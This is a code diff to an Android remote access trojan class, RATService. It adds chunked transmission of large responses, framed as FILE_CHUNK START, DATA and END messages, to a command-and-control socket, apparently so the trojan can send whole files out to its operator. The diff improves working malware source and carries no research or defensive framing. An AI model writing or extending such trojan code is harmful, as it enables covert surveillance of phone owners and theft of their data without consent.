@@ -447,11 +447,45 @@ public class RATService extends Service {
     }
     
     private void sendCommand(String data) {
-        if (out != null) {
-            out.println(data);
-            out.flush();
+    if (out != null) {
+        try {
+            // For very large data, send in chunks
+            if (data.length() > 65536) { // 64KB threshold
+                Log.d(TAG, "Large response detected (" + data.length() + " chars), sending in chunks");
+                
+                // Send header with total size
+                out.println("FILE_CHUNK|START|" + data.length());
+                out.flush();
+                
+                // Send in 32KB chunks
+                int chunkSize = 32768;
+                for (int i = 0; i < data.length(); i += chunkSize) {
+                    int end = Math.min(i + chunkSize, data.length());
+                    String chunk = data.substring(i, end);
+                    out.println("FILE_CHUNK|DATA|" + i + "|" + chunk);
+                    out.flush();
+                    
+                    // Small delay to prevent overwhelming the socket
+                    try {
+                        Thread.sleep(10);
+                    } catch (InterruptedException e) {
+                        // Ignore
+                    }
+                }
+                
+                // Send end marker
+                out.println("FILE_CHUNK|END");
+                out.flush();
+            } else {
+                // Normal size, send normally
+                out.println(data);
+                out.flush();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending command", e);
         }
     }
+}
     
     private void processCommand(String command) {
         Log.d(TAG, "Received raw command: " + command);
